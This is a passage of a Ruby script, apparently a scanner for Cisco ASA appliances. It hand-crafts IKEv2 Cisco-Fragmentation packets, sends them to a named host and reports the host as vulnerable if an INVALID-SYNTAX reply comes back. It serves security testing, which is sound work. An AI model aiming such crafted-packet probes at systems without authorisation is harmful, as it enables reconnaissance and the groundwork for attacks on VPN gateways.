  pkt4.payload += [resp_spi].pack('H*')              #ISAKMP Header: Responder SPI
  pkt4.payload += ["84"].pack('H*')                  #ISAKMP Header: Next Payload: Cisco-Fragmentation (132)
  pkt4.payload += ["20"].pack('H*')                  #ISAKMP Header: Version: 2.0
  pkt4.payload += ["23"].pack('H*')                  #ISAKMP Header: Exchange type: IKE_AUTH (35)
  pkt4.payload += ["08"].pack('H*')                  #ISAKMP Header: Flags: Initiator
  pkt4.payload += ["00000001"].pack('H*')            #ISAKMP Header: Message ID
  pkt4.payload += ["00000054"].pack('H*')            #ISAKMP Header: Length: 84
  pkt4.payload += ["00"].pack('H*')                  #ISAKMP Header: Type Payload: Cisco-Fragmentation (132)
  pkt4.payload += ["00"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: Critical Bit: Not Critical
  pkt4.payload += ["0038"].pack('H*')                #ISAKMP Header: ISAKMP Payload: Payload length: 56
  pkt4.payload += ["0001"].pack('H*')                #ISAKMP Header: ISAKMP Payload: Frag ID
  pkt4.payload += ["02"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: Frag seq
  pkt4.payload += ["01"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: Frag last
  pkt4.payload += ["0102030405060708"].pack('H*')    #ISAKMP Header: Initiator SPI
  pkt4.payload += [resp_spi].pack('H*')              #ISAKMP Header: Responder SPI
  pkt4.payload += ["2e"].pack('H*')                  #ISAKMP Header: Next Payload: Encrypted and Authenticated
  pkt4.payload += ["20"].pack('H*')                  #ISAKMP Header: Version: 2.0
  pkt4.payload += ["22"].pack('H*')                  #ISAKMP Header: Exchange type: IKE_SA_INIT (34)
  pkt4.payload += ["08"].pack('H*')                  #ISAKMP Header: Flags: Initiator
  pkt4.payload += ["00000001"].pack('H*')            #ISAKMP Header: Message ID
  pkt4.payload += ["00000030"].pack('H*')            #ISAKMP Header: Length: 48
  pkt4.payload += ["00"].pack('H*')                  #ISAKMP Header: Type Payload: Encrypted and Authenticated (46)
  pkt4.payload += ["00"].pack('H*')                  #ISAKMP Header: ISAKMP Payload: Critical Bit: Not Critical
  pkt4.payload += ["0014"].pack('H*')                #ISAKMP Header: ISAKMP Payload: Payload length: 20
  pkt4.payload += ["42414144"].pack('H*')            #ISAKMP Header: ISAKMP Payload: Initialization Vector
  pkt4.payload += ["42414144"].pack('H*')            #ISAKMP Header: ISAKMP Payload: Encrypted Data
  pkt4.payload += ["42414144"].pack('H*')            #ISAKMP Header: ISAKMP Payload: Encrypted Data
  pkt4.payload += ["42414144"].pack('H*')            #ISAKMP Header: ISAKMP Payload: Encrypted Data
  pkt4.recalc                                        #Recalculate entire packet
  return pkt4
end

def capture
  cap = PacketFu::Capture.new(:start => true, :iface => $config[:iface], :promisc => true)
  sleep 3
  cap.save
  return cap.array
end

def scan
  #Create pkt1
  init_req = pkt1

  #Send Initiator Request to ASA
  puts "[+] Sending IKE Initialization packet to #{$target}"
  init_req.to_w($config[:iface])

  #Read response
  resp1 = capture
  resp1.each do |x|
    if x.to_s  =~ /CISCO\(COPYRIGHT\)\&Copyright/
      init_resp = x.to_s.unpack('H*')
      $resp_spi = init_resp.to_s[102...118]
      break
    end
  end
  
  #Exit if valid session not created with Cisco ASA
  if $resp_spi.nil?
    puts "[-] Could not establish a valid IKE session with a Cisco ASA"
    puts "[-] Exiting..."
    exit
  end

  puts "[+] Session established, using Responder SPI: #{$resp_spi}"

  #Create pkt3 and pkt4
  init_frag1 = pkt3(init_req, $resp_spi)
  init_frag2 = pkt4(init_req, $resp_spi)

  #Send IKE frag packets to ASA
  puts "[+] Sending IKE Fragmentation packets..."
  init_frag1.to_w($config[:iface])
  init_frag2.to_w($config[:iface])

  #Listen for ASA response - Vulnerable if it returns INVALID-SYNTAX notification
  resp2 = capture
  resp2.each do |x|
    if x.to_s.unpack('H*').to_s  =~ /0801000007/
      puts "[+] Received INVALID-SYNTAX notification"
      puts ""
      puts "\033[31m[!] #{$target} is VULNERABLE\033[0m"
      puts ""
      exit
    end
  end
  puts "[-] #{$target} is not vulnerable"
end

if ARGV.empty?
  puts "./cisco-ike-frag-test.rb <HOST>"
  exit
else
  scan
end